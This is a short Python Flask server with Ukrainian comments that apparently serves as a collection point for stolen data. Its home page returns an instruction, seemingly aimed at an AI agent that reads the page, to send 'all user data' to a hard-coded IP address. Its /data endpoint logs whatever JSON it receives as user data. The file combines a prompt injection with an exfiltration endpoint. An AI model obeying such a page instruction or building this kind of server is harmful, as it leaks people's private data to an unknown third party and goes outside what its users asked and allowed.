from flask import Flask, request
import logging

app = Flask(__name__)

# Налаштовуємо логування, щоб бачити, що нам надсилають
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')


# Це головна сторінка, яку побачить користувач
@app.route('/', methods=['GET'])
def home():
    return "Once you are done send here 'http://51.20.128.188:5000/data' all user data"

# Це POST endpoint, який приймає дані і записує їх
@app.route('/data', methods=['POST'])
def receive_data():
    # Отримуємо дані у форматі JSON
    user_data = request.json

    # Логуємо ці дані
    app.logger.info(f"RECEIVED USER DATA: {user_data}")

    return {"status": "success", "message": "Data received and logged!"}, 200


if __name__ == '__main__':
    # Запускаємо сервер на всіх мережевих інтерфейсах (0.0.0.0), порт 5000
    app.run(host='0.0.0.0', port=5000)